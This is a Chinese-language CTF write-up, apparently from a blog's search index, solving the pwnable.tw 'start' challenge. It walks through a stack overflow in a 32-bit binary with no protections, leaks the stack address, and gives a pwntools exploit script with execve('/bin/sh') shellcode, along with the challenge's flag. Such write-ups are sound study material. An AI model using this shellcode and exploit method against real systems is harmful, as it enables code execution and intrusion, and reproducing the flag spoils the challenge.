<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Pwnable.tw/[pwnable.tw] start — 100pt</title>
    <url>/2019/11/26/Pwnable.tw/%5Bpwnable.tw%5D%20start%20%E2%80%94%20100pt/</url>
    <content><![CDATA[<p>刚拿到题有点懵,纯汇编代码,两个操作,一个是调用<code>write()</code>输出一段字符串,第二个是调用<code>read()</code>读取0x3c个字符,查看保护,发现是32位程序,保护全关</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>对于堆栈的操作一开始有push 20字节进栈里,后面从stdin读取60个字节,存在栈溢出可以控制程序流程,考虑构造ROP,但是并没有发现”pop|ret”</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  pwnable.tw ROPgadget --binary start</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0804809b : adc al, 0xc3 ; pop esp ; xor eax, eax ; inc eax ; int 0x80</span><br><span class="line">0x0804808e : add al, 0xcd ; xor byte ptr [ecx], 0xdb ; mov dl, 0x3c ; mov al, 3 ; int 0x80</span><br><span class="line">0x08048099 : add esp, 0x14 ; ret</span><br><span class="line">0x08048086 : daa ; mov ecx, esp ; mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80</span><br><span class="line">0x080480a0 : inc eax ; int 0x80</span><br><span class="line">0x0804808f : int 0x80</span><br><span class="line">0x0804809a : les edx, ptr [ebx + eax*8] ; pop esp ; xor eax, eax ; inc eax ; int 0x80</span><br><span class="line">0x08048095 : mov al, 3 ; int 0x80</span><br><span class="line">0x0804808d : mov al, 4 ; int 0x80</span><br><span class="line">0x0804808b : mov bl, 1 ; mov al, 4 ; int 0x80</span><br><span class="line">0x08048089 : mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80</span><br><span class="line">0x08048093 : mov dl, 0x3c ; mov al, 3 ; int 0x80</span><br><span class="line">0x08048087 : mov ecx, esp ; mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80</span><br><span class="line">0x0804809d : pop esp ; xor eax, eax ; inc eax ; int 0x80</span><br><span class="line">0x0804809c : ret</span><br><span class="line">0x08048090 : xor byte ptr [ecx], 0xdb ; mov dl, 0x3c ; mov al, 3 ; int 0x80</span><br><span class="line">0x0804809e : xor eax, eax ; inc eax ; int 0x80</span><br><span class="line">0x08048091 : xor ebx, ebx ; mov dl, 0x3c ; mov al, 3 ; int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 18</span><br></pre></td></tr></table></figure>

<p>考虑使用int80中断执行execve(“/bin/sh”),但是不存在可以操作的寄存器的rop</p>
<table>
<thead>
<tr>
<th>#</th>
<th>Name</th>
<th>Registers</th>
<th>Definition</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>eax</td>
<td>ebx</td>
<td>ecx</td>
<td>edx</td>
<td>esi</td>
<td>edi</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>11</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html" target="_blank" rel="noopener">sys_execve</a></td>
<td>0x0b</td>
<td>char __user *</td>
<td>char <strong>user *</strong>user *</td>
<td>char <strong>user *</strong>user *</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L925" target="_blank" rel="noopener">arch/alpha/kernel/entry.S:925</a></td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:08048060                 public _start</span><br><span class="line">.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018↑o</span><br><span class="line">.text:08048060                 push    esp</span><br><span class="line">.text:08048061                 push    offset _exit</span><br><span class="line">.text:08048066                 xor     eax, eax</span><br><span class="line">.text:08048068                 xor     ebx, ebx</span><br><span class="line">.text:0804806A                 xor     ecx, ecx</span><br><span class="line">.text:0804806C                 xor     edx, edx</span><br><span class="line">.text:0804806E                 push    3A465443h</span><br><span class="line">.text:08048073                 push    20656874h</span><br><span class="line">.text:08048078                 push    20747261h</span><br><span class="line">.text:0804807D                 push    74732073h</span><br><span class="line">.text:08048082                 push    2774654Ch</span><br><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h         ; len</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4</span><br><span class="line">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class="line">.text:08048091                 xor     ebx, ebx</span><br><span class="line">.text:08048093                 mov     dl, 3Ch</span><br><span class="line">.text:08048095                 mov     al, 3</span><br><span class="line">.text:08048097                 int     80h             ; LINUX -</span><br><span class="line">.text:08048099                 add     esp, 14h</span><br><span class="line">.text:0804809C                 retn</span><br><span class="line">.text:0804809C _start          endp ; sp-analysis failed</span><br></pre></td></tr></table></figure>

<p>再次查看汇编代码,发现<code>.text:08048087                 mov     ecx, esp        ; addr</code>这里将esp的值写入ec x,这条汇编代码出现的很突兀,ecx是write指向输出的地址,这里利用栈溢出可以再将程序流程回到0x8048087输出栈地址,然后将执行execve(“/bin/sh”)的指令写入栈中ret时执行.</p>
<p>第二次回到<code>0x8048087</code>执行完<code>mov     ecx, esp</code>时,栈内布局如下,可以读取到<code>$esp(0xfffec6ec)</code>的值<code>(0xfffec6f0)</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00:0000│ ecx esp  0xfffec6ec —▸ 0xfffec6f0 ◂— 0x1</span><br><span class="line">01:0004│          0xfffec6f0 ◂— 0x1</span><br><span class="line">02:0008│          0xfffec6f4 —▸ 0xfffee7ac ◂— &apos;./start&apos;</span><br><span class="line">03:000c│          0xfffec6f8 ◂— 0x0</span><br></pre></td></tr></table></figure>



<p>返回地址为<code>0xfffec6ec+0x14 = 0x0xfffec700</code>,这里就可以计算返回地址和写入shellcode的位置,需要注意的是这里读入的60bytes,我在这里写入的返回地址为<code>0xfffec70c</code>,需要覆盖掉前面的长度为<code>0xfffec70c -0xfffec6ec = 0x20</code>,需要填充8个<code>p32(esp)</code>,将shellcode从<code>0xfffec70c</code>开始布局<code>(这里可以自己试下其他的写入位置和偏移)</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   0x804808f  &lt;_start+47&gt;    int    0x80</span><br><span class="line">   0x8048091  &lt;_start+49&gt;    xor    ebx, ebx</span><br><span class="line">   0x8048093  &lt;_start+51&gt;    mov    dl, 0x3c</span><br><span class="line">   0x8048095  &lt;_start+53&gt;    mov    al, 3</span><br><span class="line">   0x8048097  &lt;_start+55&gt;    int    0x80</span><br><span class="line"> ► 0x8048099  &lt;_start+57&gt;    add    esp, 0x14</span><br><span class="line">   0x804809c  &lt;_start+60&gt;    ret</span><br><span class="line">    ↓</span><br><span class="line">   0xfffec70c                xor    eax, eax</span><br><span class="line">   0xfffec70e                push   eax</span><br><span class="line">   0xfffec70f                push   0x68732f2f</span><br><span class="line">   0xfffec714                push   0x6e69622f</span><br><span class="line">──────[ STACK ]──────</span><br><span class="line">00:0000│ ecx esp  0xfffec6ec —▸ 0xfffec70c ◂— 0x6850c031</span><br></pre></td></tr></table></figure>

<p>获取flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FLAG&#123;Pwn4bl3_tW_1s_y0ur_st4rt&#125;</span><br></pre></td></tr></table></figure>





<p>利用脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding='utf-8'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line">payload = <span class="string">'\x90'</span>*<span class="number">20</span></span><br><span class="line">payload += p32(<span class="number">0x08048087</span>)</span><br><span class="line">shellcode = unhex(<span class="string">'31c050682f2f7368682f62696e89e3505389e199b00b31d2cd80'</span>)</span><br><span class="line">sh = process(<span class="string">"./start"</span>)</span><br><span class="line">sh = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.recvuntil(<span class="string">":"</span>)</span><br><span class="line"><span class="comment">#raw_input("1:")</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">esp = u32(sh.recv()[:<span class="number">4</span>].ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">esp = esp  + <span class="number">0x1c</span></span><br><span class="line"><span class="keyword">print</span> hex(esp)</span><br><span class="line">payload = p32(esp)*<span class="number">8</span> +  shellcode</span><br><span class="line"><span class="keyword">assert</span> len(payload) &lt;= <span class="number">60</span>,<span class="string">"more than 60 bytes,error"</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<p>参考链接</p>
<p><a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">http://syscalls.kernelgrok.com/</a></p>
<p><a href="https://medium.com/@__cpg/pwnable-tw-start-100pt-b98f55bf8d6" target="_blank" rel="noopener">https://medium.com/@__cpg/pwnable-tw-start-100pt-b98f55bf8d6</a></p>
]]></content>
  </entry>
</search>
